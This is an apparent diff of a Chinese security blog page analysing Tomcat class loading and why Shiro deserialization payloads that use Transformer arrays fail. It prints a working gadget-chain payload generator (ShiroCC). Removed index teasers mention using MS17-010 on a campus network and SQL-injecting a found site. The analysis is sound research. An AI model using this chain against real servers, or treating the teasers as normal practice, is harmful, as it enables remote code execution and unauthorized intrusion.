&#123;</span><br><span class="line">            <span class="comment">// Swallow all exceptions apart from those that must be re-thrown</span></span><br><span class="line">            ExceptionUtils.handleThrowable(t);</span><br><span class="line">            <span class="comment">// The getResource() trick won&#x27;t work for this class. We have to</span></span><br><span class="line">            <span class="comment">// try loading it directly and accept that we might get a</span></span><br><span class="line">            <span class="comment">// ClassNotFoundException.</span></span><br><span class="line">            tryLoadingFromJavaseLoader = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tryLoadingFromJavaseLoader) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = javaseLoader.loadClass(name);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (resolve)</span><br><span class="line">                        resolveClass(clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// Ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (0.5) Permission to access this class when using a SecurityManager</span></span><br><span class="line">        <span class="keyword">if</span> (securityManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = name.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    securityManager.checkPackageAccess(name.substring(<span class="number">0</span>,i));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                    String error = <span class="string">&quot;Security Violation, attempt to use &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Restricted Class: &quot;</span> + name;</span><br><span class="line">                    log.info(error, se);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(error, se);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> delegateLoad = delegate || filter(name, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (1) Delegate to our parent if requested</span></span><br><span class="line">        <span class="keyword">if</span> (delegateLoad) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                log.debug(<span class="string">&quot;  Delegating to parent classloader1 &quot;</span> + parent);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = Class.forName(name, <span class="keyword">false</span>, parent);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                        log.debug(<span class="string">&quot;  Loading class from parent&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (resolve)</span><br><span class="line">                        resolveClass(clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// Ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (2) Search local repositories</span></span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">            log.debug(<span class="string">&quot;  Searching local repositories&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                    log.debug(<span class="string">&quot;  Loading class from local repository&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// Ignore</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (3) Delegate to parent unconditionally</span></span><br><span class="line">        <span class="keyword">if</span> (!delegateLoad) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                log.debug(<span class="string">&quot;  Delegating to parent classloader at end: &quot;</span> + parent);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = Class.forName(name, <span class="keyword">false</span>, parent);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                        log.debug(<span class="string">&quot;  Loading class from parent&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (resolve)</span><br><span class="line">                        resolveClass(clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// Ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>和前面说的一般不重写loadClass，而是重写findClass不同，实际上WebappClassLoaderBase重写了loadClass方法。这是因为tomcat设计上需要打破jdk默认的双亲委派机制。具体流程大概是这样：<br>1、先在tomcat的缓存中查找该类是否已经加载过<br>2、如果没有，在jdk的缓存里查找该类是否已经加载过<br>3、如果没有，则使用ExtClassLoader#loadClass加载，ExtClassLoader会走双亲委派。这里是为了在打破双亲委派的同时保留加载系统内置类的功能，绕过AppClassLoader。<br>4、如果没有加载成功，判断是否设置了delegate也就是遵循双亲委派，默认是false，就会调用WebAppClassLoader#findClass方法进行加载。<br>5、如果没有加载成功，会用父类加载器调用Class#forName进行加载，也就是用tomcat中的CommonClassLoader。<br>可以看到在这个过程里，实际上是既有Class#forName又有ClassLoader#loadClass的。而forName是可以加载数组类的，也就是说问题就出在WebAppClassLoader#findClass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">        log.debug(<span class="string">&quot;    findClass(&quot;</span> + name + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    checkStateForClassLoading(name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Permission to define this class when using a SecurityManager</span></span><br><span class="line">    <span class="keyword">if</span> (securityManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = name.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isTraceEnabled())</span><br><span class="line">                    log.trace(<span class="string">&quot;      securityManager.checkPackageDefinition&quot;</span>);</span><br><span class="line">                securityManager.checkPackageDefinition(name.substring(<span class="number">0</span>,i));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception se) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isTraceEnabled())</span><br><span class="line">                    log.trace(<span class="string">&quot;      --&gt;Exception--&gt;ClassNotFoundException&quot;</span>, se);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name, se);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ask our superclass to locate this class, if possible</span></span><br><span class="line">    <span class="comment">// (throws ClassNotFoundException if it is not found)</span></span><br><span class="line">    Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled())</span><br><span class="line">            log.trace(<span class="string">&quot;      findClassInternal(&quot;</span> + name + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (securityManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">                PrivilegedAction&lt;Class&lt;?&gt;&gt; dp =</span><br><span class="line">                    <span class="keyword">new</span> PrivilegedFindClassByName(name);</span><br><span class="line">                clazz = AccessController.doPrivileged(dp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                clazz = findClassInternal(name);</span><br><span class="line">            &#125;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看看findClassInternal</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClassInternal(String name) &#123;</span><br><span class="line"></span><br><span class="line">    checkStateForResourceLoading(name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String path = binaryNameToPath(name, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    ResourceEntry entry = resourceEntries.get(path);</span><br><span class="line">    WebResource resource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (entry == <span class="keyword">null</span>) &#123;</span><br><span class="line">        resource = resources.getClassLoaderResource(path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!resource.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        entry = <span class="keyword">new</span> ResourceEntry();</span><br><span class="line">        entry.lastModified = resource.getLastModified();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add the entry in the local resource repository</span></span><br><span class="line">        <span class="keyword">synchronized</span> (resourceEntries) &#123;</span><br><span class="line">            <span class="comment">// Ensures that all the threads which may be in a race to load</span></span><br><span class="line">            <span class="comment">// a particular class all end up with the same ResourceEntry</span></span><br><span class="line">            <span class="comment">// instance</span></span><br><span class="line">            ResourceEntry entry2 = resourceEntries.get(path);</span><br><span class="line">            <span class="keyword">if</span> (entry2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                resourceEntries.put(path, entry);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                entry = entry2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = entry.loadedClass;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = defineClass(name, binaryContent, <span class="number">0</span>,</span><br><span class="line">                    binaryContent.length, <span class="keyword">new</span> CodeSource(codeBase, certificates));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedClassVersionError ucve) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedClassVersionError(</span><br><span class="line">                    ucve.getLocalizedMessage() + <span class="string">&quot; &quot;</span> +</span><br><span class="line">                    sm.getString(<span class="string">&quot;webappClassLoader.wrongVersion&quot;</span>,</span><br><span class="line">                            name));</span><br><span class="line">        &#125;</span><br><span class="line">        entry.loadedClass = clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br></pre></td></tr></table></figure>
+<p>具体流程先不看，name一开始就经过了binaryNameToPath</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">binaryNameToPath</span><span class="params">(String binaryName, <span class="keyword">boolean</span> withLeadingSlash)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1 for leading &#x27;/&#x27;, 6 for &quot;.class&quot;</span></span><br><span class="line">    StringBuilder path = <span class="keyword">new</span> StringBuilder(<span class="number">7</span> + binaryName.length());</span><br><span class="line">    <span class="keyword">if</span> (withLeadingSlash) &#123;</span><br><span class="line">        path.append(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    path.append(binaryName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    path.append(CLASS_FILE_SUFFIX);</span><br><span class="line">    <span class="keyword">return</span> path.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实际上也是和URLClassLoader#findClass类似的改成/a/b/c.class形式，通过文件名用defineClass加载，那么一样也不能加载数组类。<br>到这里也就知道具体的解释了，ParallelWebappClassLoader加载范围内的类，实际上就是WEB-INF/classes和WEB-INF/lib这两个路径下的类，是不能加载数组类的。<br>那么其他路径下的数组类，也就是用CommonClassLoader进行forName的方法进行加载。forName是可以加载数组类的，但要确认用CommonClassLoader作为类加载器是否能加载不在CommonClassLoader路径下的类。实际上CommonClassLoader是一个URLClassLoader，其中的URL只有tomcat/lib下面的jar包。<br>那这里就有有一个比较微妙的地方，也是之前分析类加载时忽略的地方：Class#forName进行类加载时会遵循双亲委派吗？<br>实际上根据经验，答案是会。因为我们调用默认的Class#forName时实际上是调用的native方法forName0，配置的类加载器是AppClassLoader，而此时是可以加载java.lang.String之类的内置类的。<br>说了这么多，结论就是在tomcat中，ParallelWebappClassLoader#loadClass不能加载自己web项目下的数组类，包括WEB-INF/classes和WEB-INF/lib两个目录，其他路径下的数组类可以加载。<br>解决方法，最通用的自然就是让payload里不出现数组类。CC中Transformer数组类实际上有两种功能：<br>1、InvokerTransformer调用Runtime#exec时需要循环调用解决不能序列化的问题<br>2、无法控制调用点输入时需要用ConstantTransforer传递常量值<br>解决第一点的话，就是不用Runtime#exec作为触发点，改用TemplatesImpl。解决第二点，就需要调用链能完全控制一个输入参数，一直传递到执行点，满足这个条件的就是CC6。拼接一下就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroCC</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        Field bytecodesField = tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Test.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC6</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois= <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也可以用JRMP之类的二次反序列化来绕过限制，但之前分析过JRMP链在JDK高版本(&gt;8u241)是用不了的。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a><br><a target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a><br><a target="_blank" rel="noopener" href="http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</a></p>
+
       
 
       
@@ -177,30 +204,87 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">机器学习</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/26/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E7%BB%83%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0hw1/">展开全文 >></a>
-        </p>
-      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/12/06/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Java序列化与反序列化流程分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/22/%E7%8C%8E%E4%BA%BA%E8%BF%98%E6%98%AF%E7%8C%8E%E7%89%A9-RMI%E4%B9%8B%E5%8F%8D%E5%88%B6%E7%AF%87/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">猎人还是猎物-RMI之反制篇</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -220,381 +304,14 @@
 
 
 
-
-  
-    <article id="post-windows持续控制" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/05/21/windows%E6%8C%81%E7%BB%AD%E6%8E%A7%E5%88%B6/">windows持续控制</a>
-    </h1>
-  
-
-        
-        <a href="/2017/05/21/windows%E6%8C%81%E7%BB%AD%E6%8E%A7%E5%88%B6/" class="archive-article-date">
-  	<time datetime="2017-05-21T11:44:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。
-        
-          <a class="article-more-a" href="/2017/05/21/windows%E6%8C%81%E7%BB%AD%E6%8E%A7%E5%88%B6/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/05/21/windows%E6%8C%81%E7%BB%AD%E6%8E%A7%E5%88%B6/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-aspx站从注入到拉闸" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/06/aspx%E7%AB%99%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8B%89%E9%97%B8/">aspx站从注入到拉闸</a>
-    </h1>
-  
-
-        
-        <a href="/2017/04/06/aspx%E7%AB%99%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8B%89%E9%97%B8/" class="archive-article-date">
-  	<time datetime="2017-04-06T14:42:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="偶遇"><a href="#偶遇" class="headerlink" title="偶遇"></a>偶遇</h3><p>北科第一黑找了个叫自助管理系统的站，以为是个重要系统，先扫端口。发现8080有个sqlwebservice，并不会用。回头wvs扫主站没想到登陆框直接有个post注入。
-        
-          <a class="article-more-a" href="/2017/04/06/aspx%E7%AB%99%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8B%89%E9%97%B8/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
